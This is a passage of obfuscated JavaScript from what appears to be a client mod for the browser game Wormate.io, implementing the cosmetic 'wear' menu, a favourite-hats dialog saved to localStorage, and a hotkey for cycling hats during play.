            _0x1c1e7b.og.Ak(_0x1c1e7b.og._j);
          });
          _0x87f05e.click(function () {
            _0x1c1e7b.Ci.Be();
            _0x1c1e7b.og.Ak(_0x1c1e7b.og.ik);
          });
          _0x21ac49.click(function () {
            _0x1c1e7b.Ci.Be();
            _0x1c1e7b.og.Ak(_0x1c1e7b.og.mk);
          });
        });
        _0xdac43.prototype.ha = function () {
          _0xdac43.parent.prototype.ha.call(this);
        };
        _0xdac43.prototype.qo = function () {
          _0x31b4a1.bo.go.stop();
          _0x31b4a1.bo.go.fadeOut(50);
          _0x31b4a1.bo.ho.stop();
          _0x31b4a1.bo.ho.fadeOut(50);
          _0x31b4a1.bo.io.stop();
          _0x31b4a1.bo.io.fadeOut(50);
          _0x31b4a1.bo.ko.stop();
          _0x31b4a1.bo.ko.fadeOut(50);
          _0x31b4a1.bo.jo.stop();
          _0x31b4a1.bo.jo.fadeOut(50);
          _0x31b4a1.bo.lo.stop();
          _0x31b4a1.bo.lo.fadeOut(50);
          _0x31b4a1.bo.mo.stop();
          _0x31b4a1.bo.mo.fadeIn(200);
          _0x31b4a1.bo.no.stop();
          _0x31b4a1.bo.no.fadeOut(50);
          _0x31b4a1.bo.oo.stop();
          _0x31b4a1.bo.oo.fadeOut(50);
          _0x31b4a1.bo.po.stop();
          _0x31b4a1.bo.po.fadeOut(50);
        };
        _0xdac43.prototype.Hk = function () {
          _0xe610a0().Ci.Ce();
        };
        return _0xdac43;
      }();
      _0x31b4a1.nk = function () {
        var _0x5b80d7 = $("#wear-view-canv");
        var _0x3b2f0e = $("#wear-description-text");
        var _0x4b4d3f = $("#wear-locked-bar");
        var _0x2b37c1 = $("#wear-locked-bar-text");
        var _0x2e90a1 = $("#wear-buy-button");
        var _0x2e2150 = $("#wear-item-price");
        var _0x55453d = $("#wear-eyes-button");
        var _0x294cdb = $("#wear-mouths-button");
        var _0x3f5129 = $("#wear-glasses-button");
        var _0xc3cb50 = $("#wear-hats-button");
        var _0x34168a = $("#wear-tint-chooser");
        var _0x53e00b = $("#wear-view-prev");
        var _0x44aac8 = $("#wear-view-next");
        var _0xdfa2b = _0x2c22d1.M(_0x31b4a1.bo, function () {
          var _0x556344 = this;
          _0x31b4a1.bo.call(this, _0x2c22d1.H("index.game.popup.menu.wear.tab"), true);
          var _0x54a639 = _0xe610a0();
          var _0x5a997d = this;
          this.Zo = [];
          this.uj = new _0x2918d9(this, _0x31b4a1.tj.uj, _0x55453d);
          this.vj = new _0x2918d9(this, _0x31b4a1.tj.vj, _0x294cdb);
          this.xj = new _0x2918d9(this, _0x31b4a1.tj.xj, _0x3f5129);
          this.wj = new _0x2918d9(this, _0x31b4a1.tj.wj, _0xc3cb50);
          this.$o = null;
          this._o = null;
          this.ap = null;
          this.bp = null;
          this.cp = null;
          this.dp = null;
          this.Ko = new _0x31b4a1.dm(_0x5b80d7);
          _0x2e90a1.click(function () {
            _0x54a639.Ci.Be();
            _0x5a997d.ep();
          });
          _0x53e00b.click(function () {
            _0x54a639.Ci.Be();
            _0x5a997d.$o.fp();
          });
          _0x44aac8.click(function () {
            _0x54a639.Ci.Be();
            _0x5a997d.$o.gp();
          });
          _0x55453d.click(function () {
            _0x54a639.Ci.Be();
            _0x5a997d.hp(_0x556344.uj);
          });
          _0x294cdb.click(function () {
            _0x54a639.Ci.Be();
            _0x5a997d.hp(_0x556344.vj);
          });
          _0x3f5129.click(function () {
            _0x54a639.Ci.Be();
            _0x5a997d.hp(_0x556344.xj);
          });
          _0xc3cb50.click(function () {
            _0x54a639.Ci.Be();
            _0x5a997d.hp(_0x556344.wj);
          });
          this.Zo.push(this.uj);
          this.Zo.push(this.vj);
          this.Zo.push(this.xj);
          this.Zo.push(this.wj);
        });
        _0xdfa2b.prototype.ha = function () {
          _0xdfa2b.parent.prototype.ha.call(this);
          var _0x83f995 = _0xe610a0();
          var _0x586fa1 = this;
          _0x83f995.Lc.$b(function () {
            var _0x150792 = _0x83f995.Lc.Xb();
            _0x586fa1._o = _0x150792.eyesDict;
            _0x586fa1.ap = _0x150792.mouthDict;
            _0x586fa1.bp = _0x150792.glassesDict;
            _0x586fa1.cp = _0x150792.hatDict;
            _0x586fa1.dp = _0x150792.colorDict;
            _0x586fa1.uj.ip(_0x150792.eyesVariantArray);
            _0x586fa1.uj.jp(_0x586fa1._o);
            _0x586fa1.vj.ip(_0x150792.mouthVariantArray);
            _0x586fa1.vj.jp(_0x586fa1.ap);
            _0x586fa1.xj.ip(_0x150792.glassesVariantArray);
            _0x586fa1.xj.jp(_0x586fa1.bp);
            _0x586fa1.wj.ip(_0x150792.hatVariantArray);
            _0x586fa1.wj.jp(_0x586fa1.cp);
          });
          this.Po(false);
          _0x83f995.On.zj(function () {
            _0x586fa1.Po(false);
          });
        };
        _0xdfa2b.prototype.qo = function () {
          _0x31b4a1.bo.go.stop();
          _0x31b4a1.bo.go.fadeOut(50);
          _0x31b4a1.bo.ho.stop();
          _0x31b4a1.bo.ho.fadeOut(50);
          _0x31b4a1.bo.io.stop();
          _0x31b4a1.bo.io.fadeOut(50);
          _0x31b4a1.bo.ko.stop();
          _0x31b4a1.bo.ko.fadeOut(50);
          _0x31b4a1.bo.jo.stop();
          _0x31b4a1.bo.jo.fadeOut(50);
          _0x31b4a1.bo.lo.stop();
          _0x31b4a1.bo.lo.fadeOut(50);
          _0x31b4a1.bo.mo.stop();
          _0x31b4a1.bo.mo.fadeOut(50);
          _0x31b4a1.bo.no.stop();
          _0x31b4a1.bo.no.fadeIn(200);
          _0x31b4a1.bo.oo.stop();
          _0x31b4a1.bo.oo.fadeOut(50);
          _0x31b4a1.bo.po.stop();
          _0x31b4a1.bo.po.fadeOut(50);
        };
        _0xdfa2b.prototype.Hk = function () {
          _0xe610a0().Ci.pe(_0x31b4a1.ge.je._e);
          _0xe610a0().Ci.Ce();
          this.hp(this.$o ?? this.uj);
          this.Ko.Kf(true);
        };
        _0xdfa2b.prototype.Bk = function () {
          this.Ko.Kf(false);
        };
        _0xdfa2b.prototype.Jf = function () {
          this.Ko.Jf();
        };
        _0xdfa2b.prototype.Nf = function (_0x5bfdd7, _0x7625db) {
          this.Ko.Nf();
        };
        _0xdfa2b.prototype.hp = function (_0x25bb5e) {
          this.$o = _0x25bb5e;
          for (var _0x4b2278 = 0; _0x4b2278 < this.Zo.length; _0x4b2278++) {
            this.Zo[_0x4b2278].Ao.removeClass("pressed");
          }
          this.$o.Ao.addClass("pressed");
          this.$o.Gk();
        };
        _0xdfa2b.prototype.kp = function () {
          if (this.$o == null) {
            return _0x31b4a1.Si.Ui();
          } else {
            return _0x31b4a1.Si.Vi({
              ae: this.$o.Wo(),
              nd: this.$o.nd
            });
          }
        };
        _0xdfa2b.prototype.ep = function () {
          var _0xf66027 = this;
          var _0x8638ed = this.kp();
          if (_0x8638ed.Wi()) {
            var _0x5b8a4c = _0x8638ed.bc();
            _0xf66027.lp(_0x5b8a4c.ae, _0x5b8a4c.nd);
          }
        };
        _0xdfa2b.prototype.lp = function (_0x1b0f81, _0x2a21e6) {
          var _0x965646 = _0xe610a0();
          var _0x1b9384 = _0x965646.On.Gj(_0x1b0f81, _0x2a21e6);
          if (_0x1b9384 != null) {
            var _0x2f1429 = _0x1b9384.Jj();
            if (!(_0x965646.Ij.il() < _0x2f1429)) {
              var _0x22d30b = _0x965646.On.rj(_0x31b4a1.tj.sj);
              var _0x44c69c = _0x965646.On.rj(_0x31b4a1.tj.uj);
              var _0x1f0e45 = _0x965646.On.rj(_0x31b4a1.tj.vj);
              var _0x5e4b40 = _0x965646.On.rj(_0x31b4a1.tj.xj);
              var _0x511e9c = _0x965646.On.rj(_0x31b4a1.tj.wj);
              var _0x2b5742 = this.ro(5000);
              _0x965646.Ij.Hl(_0x1b0f81, _0x2a21e6, function () {
                _0x2b5742.vo();
                _0x965646.og.Ak(_0x965646.og.tk);
              }, function (_0x3ce89d) {
                _0x965646.Ij.Bl(function () {
                  _0x965646.On.Fj(_0x22d30b, _0x31b4a1.tj.sj);
                  _0x965646.On.Fj(_0x44c69c, _0x31b4a1.tj.uj);
                  _0x965646.On.Fj(_0x1f0e45, _0x31b4a1.tj.vj);
                  _0x965646.On.Fj(_0x5e4b40, _0x31b4a1.tj.xj);
                  _0x965646.On.Fj(_0x511e9c, _0x31b4a1.tj.wj);
                  _0x965646.On.Fj(_0x1b0f81, _0x2a21e6);
                  _0x2b5742.vo();
                });
              });
            }
          }
        };
        window.globalHatTextureCache = window.globalHatTextureCache || {};
        _0xdfa2b.prototype.Po = function (_0x463e60) {
          if (!$("#wear-view").length || $("#wear-view").is(":hidden")) {
            return;
          }
          var _0xb6e8cb = _0xe610a0();
          var _0x41b651 = _0xb6e8cb.On.yj();
          var _0x240f29 = this.kp();
          if (_0x240f29.Wi()) {
            var _0x5e735f = _0x240f29.bc();
            var _0x3de051 = _0xb6e8cb.On.Gj(_0x5e735f.ae, _0x5e735f.nd);
            var _0x43413b = false;
            var _0x378a81 = _0xb6e8cb.On.Cj(_0x5e735f.ae, _0x5e735f.nd);
            if (!vps.selectedHats) {
              vps.selectedHats = [];
            }
            if (_0x378a81) {
              _0x4b4d3f.hide();
              _0x2e90a1.hide();
              if (_0x5e735f.nd === "HAT") {
                this.addSelectedHatButton(_0x5e735f.ae);
              } else {
                this.removeHatButtons();
              }
            } else if (_0x3de051 == null || _0x3de051.Kj()) {
              _0x43413b = true;
              _0x4b4d3f.show();
              _0x2e90a1.hide();
              _0x2b37c1.text(_0x2c22d1.H("index.game.popup.menu.store.locked"));
              if (_0x3de051 != null && _0x3de051.Kj()) {
                var _0x181e1b = _0xb6e8cb.Lc.Xb().textDict[_0x3de051.Em()];
                if (_0x181e1b != null) {
                  _0x2b37c1.text(_0x2c22d1.I(_0x181e1b));
                }
              }
              this.removeHatButtons();
            } else {
              _0x4b4d3f.hide();
              _0x2e90a1.show();
              _0x2e2150.html(_0x3de051.Jj());
              this.removeHatButtons();
            }
            _0x3b2f0e.html("");
            if (_0x3de051 != null && _0x3de051.Fm() != null) {
              var _0x42c53e = _0xb6e8cb.Lc.Xb().textDict[_0x3de051.Fm()];
              if (_0x42c53e != null) {
                _0x3b2f0e.html(_0x2c22d1.K(_0x2c22d1.I(_0x42c53e)));
              }
            }
            var _0x2877e8 = this.Ko;
            switch (_0x5e735f.nd) {
              case _0x31b4a1.tj.uj:
                _0x2877e8.$l(_0x41b651.Vm(_0x5e735f.ae));
                _0x2877e8.vm(_0x43413b);
                break;
              case _0x31b4a1.tj.vj:
                _0x2877e8.$l(_0x41b651.Wm(_0x5e735f.ae));
                _0x2877e8.wm(_0x43413b);
                break;
              case _0x31b4a1.tj.xj:
                _0x2877e8.$l(_0x41b651.Ym(_0x5e735f.ae));
                _0x2877e8.ym(_0x43413b);
                break;
              case _0x31b4a1.tj.wj:
                _0x2877e8.$l(_0x41b651.Xm(_0x5e735f.ae));
                _0x2877e8.xm(_0x43413b);
            }
            if (_0x463e60) {
              _0xb6e8cb.On.Fj(_0x5e735f.ae, _0x5e735f.nd);
            }
          }
        };
        _0xdfa2b.prototype.addSelectedHatButton = function (_0x1a8835) {
          this.currentHatId = _0x1a8835;
          if (!this.hatButtonContainer) {
            this.hatButtonContainer = $("<div>").attr("id", "hat-button-container").css({
              position: "absolute",
              bottom: "30px",
              left: "-10px",
              display: "flex",
              gap: "5px"
            }).appendTo("#wear-view");
            this.hatToggleButton = $("<button>").attr("id", "hat-toggle-button").css({
              padding: "5px 10px",
              "background-color": "#4CAF50",
              color: "white",
              border: "none",
              "border-radius": "4px",
              cursor: "pointer",
              "min-width": "32px"
            }).appendTo(this.hatButtonContainer);
            this.hatFavoritesButton = $("<button>").attr("id", "hat-favorites-button").css({
              padding: "5px 10px",
              "background-color": "#2196F3",
              color: "white",
              border: "none",
              "border-radius": "4px",
              cursor: "pointer"
            }).text("☰ Favorites").appendTo(this.hatButtonContainer);
            this.hatInfoText = $("<div>").attr("id", "hat-info-text").css({
              position: "absolute",
              bottom: "10px",
              left: "-5px",
              "font-size": "12px",
              color: "#fff"
            }).text("Press '( 2 )' to toggle hats during gameplay").appendTo("#wear-view");
            var _0x2d4713 = this;
            this.hatFavoritesButton.on("click", function () {
              _0x2d4713.showFavoritesDialog();
            });
          }
          let _0x502c9c = vps.selectedHats.includes(_0x1a8835);
          this.hatToggleButton.text(_0x502c9c ? "X" : "★ Add");
          this.hatToggleButton.css("background-color", _0x502c9c ? "#f44336" : "#4CAF50");
          this.hatToggleButton.off("click");
          var _0x2d4713 = this;
          this.hatToggleButton.on("click", function () {
            let _0x105e1d = vps.selectedHats.indexOf(_0x1a8835);
            if (_0x105e1d >= 0) {
              vps.selectedHats.splice(_0x105e1d, 1);
              $(this).text("★ Add").css("background-color", "#4CAF50");
            } else {
              vps.selectedHats.push(_0x1a8835);
              $(this).text("X").css("background-color", "#f44336");
            }
            localStorage.setItem("SaveGameup", JSON.stringify(vps));
            localStorage.setItem("SaveGamewup", JSON.stringify(vps));
          });
          this.hatButtonContainer.show();
          this.hatInfoText.show();
        };
        _0xdfa2b.prototype.removeHatButtons = function () {
          if (this.hatButtonContainer) {
            this.hatButtonContainer.hide();
          }
          if (this.hatInfoText) {
            this.hatInfoText.hide();
          }
        };
        function _0x2c70a9(_0x2e3364) {
          try {
            if (window.globalHatTextureCache && window.globalHatTextureCache[_0x2e3364] && window.globalHatTextureCache[_0x2e3364].valid) {
              return window.globalHatTextureCache[_0x2e3364];
            }
            if (!window._wup || !window._wup._anApp || !window._wup._anApp.Lc || !window._wup._anApp.Lc.Xb()) {
              return null;
            }
            const _0x5b1c43 = window._wup._anApp.Lc.Xb();
            if (!_0x5b1c43.hatDict || !_0x5b1c43.regionDict || !_0x5b1c43.textureDict) {
              return null;
            }
            const _0xaba633 = _0x5b1c43.hatDict[_0x2e3364];
            if (!_0xaba633 || !_0xaba633.base || !_0xaba633.base.length) {
              return null;
            }
            const _0x409f36 = _0xaba633.base[0];
            const _0x3540d9 = _0x409f36.region;
            const _0x424b56 = _0x5b1c43.regionDict[_0x3540d9];
            if (!_0x424b56) {
              return null;
            }
            const _0x32fe55 = _0x5b1c43.textureDict[_0x424b56.texture];
            if (!_0x32fe55) {
              return null;
            }
            if (!window.globalHatTextureCache) {
              window.globalHatTextureCache = {};
            }
            const _0x2abf7d = new Image();
            _0x2abf7d.crossOrigin = "anonymous";
            const _0x424576 = {
              hatId: _0x2e3364,
              image: null,
              coords: {
                x: _0x424b56.x || 0,
                y: _0x424b56.y || 0,
                width: _0x424b56.w || 0,
                height: _0x424b56.h || 0
              },
              valid: false,
              loading: true
            };
            _0x2abf7d.onload = function () {
              _0x424576.image = _0x2abf7d;
              _0x424576.valid = true;
              _0x424576.loading = false;
              window.globalHatTextureCache[_0x2e3364] = _0x424576;
            };
            _0x2abf7d.onerror = function () {
              _0x424576.loading = false;
              _0x424576.valid = false;
            };
            let _0x555b67 = _0x32fe55.relativePath || _0x32fe55.url;
            if (_0x555b67 && _0x555b67.startsWith("/")) {
              if (_0x555b67.includes("wup_")) {
                _0x555b67 = window.vps?.s_l + _0x555b67;
              } else {
                _0x555b67 = "https://resources.wormate.io" + _0x555b67;
              }
            }
            _0x2abf7d.src = _0x555b67;
            window.globalHatTextureCache[_0x2e3364] = _0x424576;
            return _0x424576;
          } catch (_0x3b6d9d) {
            return null;
          }
        }
        function _0x424c69() {
          if (!vps.selectedHats || vps.selectedHats.length === 0) {
            return;
          }
          vps.selectedHats.forEach(function (_0x519d07) {
            setTimeout(function () {
              _0x2c70a9(_0x519d07);
            }, Math.random() * 1000);
          });
        }
        _0xdfa2b.prototype.showFavoritesDialog = function () {
          _0x424c69();
        };
        function _0x474996(_0x4ce73c) {
          try {
            const _0x14fcfe = document.createElement("div");
            _0x14fcfe.style.cssText = "\n                    width: 100%; height: 100%; position: relative;\n                    overflow: visible; display: flex; justify-content: center;\n                    align-items: center;\n                ";
            const _0x3f5224 = document.createElement("div");
            _0x3f5224.textContent = "#" + _0x4ce73c;
            _0x3f5224.style.cssText = "\n                    position: absolute; top: 4px; left: 4px;\n                    background-color: rgba(0,0,0,0.6); color: white;\n                    font-size: 12px; padding: 2px 5px; border-radius: 3px; z-index: 10;\n                ";
            _0x14fcfe.appendChild(_0x3f5224);
            const _0x3b7c50 = document.createElement("canvas");
            _0x3b7c50.width = 80;
            _0x3b7c50.height = 80;
            _0x3b7c50.style.cssText = "display: block; object-fit: contain;";
            _0x14fcfe.appendChild(_0x3b7c50);
            const _0x25d1c2 = _0x3b7c50.getContext("2d");
            _0x25d1c2.clearRect(0, 0, _0x3b7c50.width, _0x3b7c50.height);
            const _0x2d5022 = _0x2c70a9(_0x4ce73c);
            if (!_0x2d5022) {
              _0x25d1c2.fillStyle = "#333";
              _0x25d1c2.fillRect(0, 0, _0x3b7c50.width, _0x3b7c50.height);
              _0x25d1c2.fillStyle = "white";
              _0x25d1c2.font = "18px Arial";
              _0x25d1c2.textAlign = "center";
              _0x25d1c2.fillText("#" + _0x4ce73c, _0x3b7c50.width / 2, _0x3b7c50.height / 2);
              return _0x14fcfe;
            }
            if (_0x2d5022.loading) {
              _0x25d1c2.fillStyle = "#555";
              _0x25d1c2.fillRect(0, 0, _0x3b7c50.width, _0x3b7c50.height);
              _0x25d1c2.fillStyle = "white";
              _0x25d1c2.font = "12px Arial";
              _0x25d1c2.textAlign = "center";
              _0x25d1c2.fillText("Loading...", _0x3b7c50.width / 2, _0x3b7c50.height / 2);
              const _0x19afb9 = setInterval(() => {
                if (_0x2d5022.valid && _0x2d5022.image) {
                  clearInterval(_0x19afb9);
                  _0x5624ab(_0x25d1c2, _0x2d5022, _0x3b7c50.width, _0x3b7c50.height);
                } else if (!_0x2d5022.loading) {
                  clearInterval(_0x19afb9);
                  _0x25d1c2.fillStyle = "#333";
                  _0x25d1c2.fillRect(0, 0, _0x3b7c50.width, _0x3b7c50.height);
                  _0x25d1c2.fillStyle = "white";
                  _0x25d1c2.font = "18px Arial";
                  _0x25d1c2.textAlign = "center";
                  _0x25d1c2.fillText("#" + _0x4ce73c, _0x3b7c50.width / 2, _0x3b7c50.height / 2);
                }
              }, 100);
            } else if (_0x2d5022.valid && _0x2d5022.image) {
              _0x5624ab(_0x25d1c2, _0x2d5022, _0x3b7c50.width, _0x3b7c50.height);
            } else {
              _0x25d1c2.fillStyle = "#333";
              _0x25d1c2.fillRect(0, 0, _0x3b7c50.width, _0x3b7c50.height);
              _0x25d1c2.fillStyle = "white";
              _0x25d1c2.font = "18px Arial";
              _0x25d1c2.textAlign = "center";
              _0x25d1c2.fillText("#" + _0x4ce73c, _0x3b7c50.width / 2, _0x3b7c50.height / 2);
            }
            return _0x14fcfe;
          } catch (_0x1d4640) {
            return _0x2b60a8(_0x4ce73c);
          }
        }
        function _0x5624ab(_0x301653, _0x51e7a5, _0x33eb42, _0x192a7b) {
          if (_0x51e7a5.coords) {
            const _0x1f9735 = Math.min((_0x33eb42 - 10) / _0x51e7a5.coords.width, (_0x192a7b - 10) / _0x51e7a5.coords.height) * 0.9;
            const _0x5c89d9 = _0x51e7a5.coords.width * _0x1f9735;
            const _0x55ac34 = _0x51e7a5.coords.height * _0x1f9735;
            const _0x18d43e = (_0x33eb42 - _0x5c89d9) / 2;
            const _0x1e66bd = (_0x192a7b - _0x55ac34) / 2;
            _0x301653.clearRect(0, 0, _0x33eb42, _0x192a7b);
            _0x301653.drawImage(_0x51e7a5.image, _0x51e7a5.coords.x, _0x51e7a5.coords.y, _0x51e7a5.coords.width, _0x51e7a5.coords.height, _0x18d43e, _0x1e66bd, _0x5c89d9, _0x55ac34);
          }
        }
        function _0x2b60a8(_0x2804b5) {
          const _0x2a6f77 = document.createElement("div");
          _0x2a6f77.style.cssText = "\n                width: 100%; height: 100%; display: flex;\n                justify-content: center; align-items: center;\n                color: white; background-color: #333;\n            ";
          _0x2a6f77.textContent = "#" + _0x2804b5;
          return _0x2a6f77;
        }
        _0xdfa2b.prototype.showFavoritesDialog = function () {
          $("#favorites-dialog, #favorites-overlay").remove();
          var _0x298ce9 = $("<div>").attr("id", "favorites-overlay").css({
            position: "fixed",
            top: "0",
            left: "0",
            width: "100%",
            height: "100%",
            "background-color": "rgba(0, 0, 0, 0.5)",
            "z-index": "999"
          }).appendTo("body");
          var _0x53a14b = $("<div>").attr("id", "favorites-dialog").css({
            position: "fixed",
            top: "50%",
            left: "50%",
            transform: "translate(-50%, -50%)",
            "background-color": "#1e1e2f",
            "border-radius": "8px",
            "box-shadow": "0 4px 8px rgba(0, 0, 0, 0.5)",
            "z-index": "1000",
            width: "500px",
            overflow: "hidden",
            color: "white"
          }).appendTo("body");
          var _0x39ccf5 = $("<div>").css({
            padding: "15px 20px",
            "background-color": "#252538",
            "border-bottom": "1px solid #333345",
            position: "relative",
            display: "flex",
            "justify-content": "space-between",
            "align-items": "center"
          }).appendTo(_0x53a14b);
          $("<h3>").text("Favorite Hats").css({
            margin: "0 0 0 5px",
            "font-size": "18px",
            color: "white",
            "padding-left": "15px"
          }).appendTo(_0x39ccf5);
          var _0x48a0ee = $("<button>").html("&times;").css({
            position: "absolute",
            top: "8px",
            left: "10px",
            "font-size": "22px",
            background: "none",
            border: "none",
            color: "#aaa",
            cursor: "pointer",
            padding: "0 5px",
            "line-height": "1",
            "font-weight": "bold"
          }).appendTo(_0x39ccf5);
          var _0x3e234e = $("<button>").text("Clear All").css({
            padding: "4px 8px",
            "background-color": "#f44336",
            color: "white",
            border: "none",
            "border-radius": "4px",
            cursor: "pointer",
            "font-size": "12px"
          }).appendTo(_0x39ccf5);
          var _0x566508 = $("<div>").attr("id", "favorites-content").css({
            padding: "15px 20px",
            "max-height": "420px",
            "overflow-y": "auto"
          }).appendTo(_0x53a14b);
          var _0x5554c0 = $("<div>").attr("class", "favorites-grid").css({
            display: "grid",
            "grid-template-columns": "1fr 1fr 1fr",
            gap: "12px",
            padding: "0",
            margin: "0"
          }).appendTo(_0x566508);
          var _0x3ec847 = this;
          _0x3e234e.on("click", function () {
            if (confirm("Are you sure you want to remove all favorite hats?")) {
              vps.selectedHats = [];
              localStorage.setItem("SaveGameup", JSON.stringify(vps));
              localStorage.setItem("SaveGamewup", JSON.stringify(vps));
              _0x5554c0.empty();
              $("<div>").css({
                "text-align": "center",
                padding: "10px",
                color: "#aaa",
                margin: "20px 0",
                "grid-column": "1 / span 3"
              }).text("You don't have any favorite hats yet.").appendTo(_0x5554c0);
              if (_0x3ec847.hatToggleButton && _0x3ec847.hatToggleButton.is(":visible")) {
                _0x3ec847.hatToggleButton.text("★ Add").css("background-color", "#4CAF50");
              }
            }
          });
          function _0x3cfd61() {
            _0x53a14b.remove();
            _0x298ce9.remove();
          }
          _0x48a0ee.on("click", _0x3cfd61);
          _0x298ce9.on("click", _0x3cfd61);
          if (!vps.selectedHats || vps.selectedHats.length === 0) {
            $("<div>").css({
              "text-align": "center",
              padding: "10px",
              color: "#aaa",
              margin: "20px 0",
              "grid-column": "1 / span 3"
            }).text("You don't have any favorite hats yet.").appendTo(_0x5554c0);
          } else {
            vps.selectedHats.forEach(function (_0x3f0169) {
              _0x2c70a9(_0x3f0169);
            });
            vps.selectedHats.forEach(function (_0x2602ed, _0x553b1e) {
              var _0x55eca8 = $("<div>").attr("data-index", _0x553b1e).attr("data-hat-id", _0x2602ed).css({
                display: "flex",
                "flex-direction": "column",
                "align-items": "center",
                padding: "2px",
                background: "#252538",
                "border-radius": "6px",
                position: "relative",
                height: "87px",
                width: "100%"
              }).appendTo(_0x5554c0);
              var _0x401313 = $("<div>").css({
                width: "100%",
                height: "82px",
                background: "transparent",
                "border-radius": "4px",
                overflow: "visible",
                position: "relative",
                display: "flex",
                "justify-content": "center",
                "align-items": "center"
              }).appendTo(_0x55eca8);
              var _0x1839a1 = $("<button>").text("X").css({
                position: "absolute",
                top: "4px",
                right: "4px",
                background: "#f44336",
                color: "white",
                border: "none",
                padding: "2px 6px",
                "border-radius": "3px",
                cursor: "pointer",
                "font-size": "12px",
                "z-index": "20"
              }).appendTo(_0x55eca8);
              var _0x4ad5c8 = _0x474996(_0x2602ed);
              _0x401313.append(_0x4ad5c8);
              _0x1839a1.on("click", function (_0x1feffd) {
                _0x1feffd.stopPropagation();
                var _0x5d59ac = $(this).closest("[data-index]");
                var _0x36a434 = parseInt(_0x5d59ac.attr("data-index"));
                var _0xe3c89 = _0x5d59ac.attr("data-hat-id");
                if (vps.selectedHats && _0x36a434 >= 0 && _0x36a434 < vps.selectedHats.length) {
                  vps.selectedHats.splice(_0x36a434, 1);
                  localStorage.setItem("SaveGameup", JSON.stringify(vps));
                  localStorage.setItem("SaveGamewup", JSON.stringify(vps));
                  _0x5d59ac.fadeOut(300, function () {
                    $(this).remove();
                    _0x5554c0.find("[data-index]").each(function (_0x27428f) {
                      $(this).attr("data-index", _0x27428f);
                    });
                    if (vps.selectedHats.length === 0) {
                      _0x5554c0.empty();
                      $("<div>").css({
                        "text-align": "center",
                        padding: "10px",
                        color: "#aaa",
                        margin: "20px 0",
                        "grid-column": "1 / span 3"
                      }).text("You don't have any favorite hats yet.").appendTo(_0x5554c0);
                    }
                    if (_0x3ec847.currentHatId === _0xe3c89 && _0x3ec847.hatToggleButton) {
                      _0x3ec847.hatToggleButton.text("★ Add").css("background-color", "#4CAF50");
                    }
                  });
                }
              });
            });
          }
        };
        function _0x25a3f2(_0x485067) {
          try {
            if (_wup && _wup._anApp && _wup._anApp.dh && _wup._anApp.dh.ch) {
              _wup._anApp.dh.ch.Eh.qi = _0x485067;
              try {
                if (_wup._anApp.dh.ch.Nm && _wup._anApp.dh.ch.Nm.yc) {
                  _wup._anApp.dh.ch.Nm.yc(_wup._anApp.dh.hh.xg, _wup._anApp.Lc.Ub().jb(_wup._anApp.dh.ch.Eh.Gh), _wup._anApp.Lc.Ub().ib(_wup._anApp.dh.ch.Eh.Hh), _wup._anApp.Lc.Ub().kb(_wup._anApp.dh.ch.Eh.ni), _wup._anApp.Lc.Ub().lb(_wup._anApp.dh.ch.Eh.oi), _wup._anApp.Lc.Ub().mb(_wup._anApp.dh.ch.Eh.pi), _wup._anApp.Lc.Ub().nb(_0x485067), "#ffffff");
                } else {
                  _wup._anApp.dh.ch.Sm();
                }
                return true;
              } catch (_0x46ecaf) {
                console.error("❌ Error rebuilding character:", _0x46ecaf);
                return false;
              }
            }
            return false;
          } catch (_0x4ef9fc) {
            console.error("❌ Error changing hat:", _0x4ef9fc);
            return false;
          }
        }
        function _0x57e53f(_0x133068) {
          if (_0x133068.Zc && _0x133068.Zc.rd) {
            return _0x133068.Zc.rd;
          }
          return null;
        }
        function _0x46dd90(_0x518bb9, _0x1c9cc9) {
          if (_0x518bb9 && _0x518bb9.length > 0) {
            const _0x543e51 = _0xe610a0().Lc.Cc().Yb(_0x1c9cc9);
            if (_0x543e51 && _0x543e51.dc && _0x543e51.dc.length > 0) {
              try {
                _0x518bb9[0].kd(_0x543e51.dc[0]);
                return true;
              } catch (_0x1562ef) {}
            }
          }
          return false;
        }
        function _0xa8417c(_0x5b2489, _0x1e9dbe) {
          if (_0x5b2489 && _0x5b2489.Zc && _0x1e9dbe) {
            try {
              _0x5b2489.Zc.yd(0.004, _0x5b2489.Zc.rd, _0x1e9dbe);
              return true;
            } catch (_0x282a9a) {}
          }
          return false;
        }
        function _0x2c96cf() {
          if (!vps.selectedHats) {
            vps.selectedHats = [];
            localStorage.setItem("SaveGameup", JSON.stringify(vps));
            localStorage.setItem("SaveGamewup", JSON.stringify(vps));
            return;
          }
          if (vps.selectedHats.length > 0) {
            if (vps.currentHatIndex === undefined) {
              vps.currentHatIndex = 0;
            } else {
              vps.currentHatIndex = (vps.currentHatIndex + 1) % vps.selectedHats.length;
            }
            let _0x441133 = vps.selectedHats[vps.currentHatIndex];
            const _0x3812be = _0x25a3f2(_0x441133);
            localStorage.setItem("SaveGameup", JSON.stringify(vps));
            localStorage.setItem("SaveGamewup", JSON.stringify(vps));
          }
        }
        function _0x4acf2a() {
          if (window.hatCyclingInitialized) {
            return;
          }
          $(document).on("keydown", function (_0x36791a) {
            if (_0x36791a.keyCode === 50 || _0x36791a.which === 50) {
              _0x2c96cf();
            }
          });
          window.hatCyclingInitialized = true;
        }
        function _0x310e67() {
          if (!vps.selectedHats || vps.selectedHats.length === 0) {
            return;
          }
          vps.selectedHats.forEach(function (_0x2649f9) {
            _0x2c70a9(_0x2649f9);
          });
        }
        $(document).ready(function () {
          setTimeout(function () {
            _0x4acf2a();
            _0x310e67();
            if (typeof vps === "undefined") {
              window.vps = {};
            }
            if (!vps.selectedHats) {
              vps.selectedHats = [];
            }
            window.openHatFavorites = function () {
              if (_0xdfa2b.prototype.showFavoritesDialog) {
                var _0x181a97 = new _0xdfa2b();
                _0x181a97.showFavoritesDialog();
              }
            };
            window.toggleHat = function () {
              _0x2c96cf();
            };
            window.addCurrentHatToFavorites = function () {};
          }, 1000);
        });
        function _0x18b727() {
          if (window.globalHatTextureCache) {
            var _0x1255b3 = Object.keys(window.globalHatTextureCache);
            if (_0x1255b3.length > 50) {
              var _0x56663a = _0x1255b3.slice(0, _0x1255b3.length - 30);
              _0x56663a.forEach(function (_0x2507ad) {
                delete window.globalHatTextureCache[_0x2507ad];
              });
            }
          }
        }
        window.addEventListener("load", function () {
          setTimeout(function () {
            _0x310e67();
            _0x18b727();
          }, 2000);
        });
        setInterval(function () {
          _0x18b727();
        }, 300000);
        function _0x1e21ae() {
          try {
            const _0x1673f9 = [];
            const _0x2f7a22 = _0xe610a0();
            const _0x463208 = _0x2f7a22.Lc.Cc();
            if (!_0x463208) {
              return _0x1673f9;
            }
            for (let _0x4ad76e in _0x463208.Vb) {
              if (_0x463208.Vb.hasOwnProperty(_0x4ad76e)) {
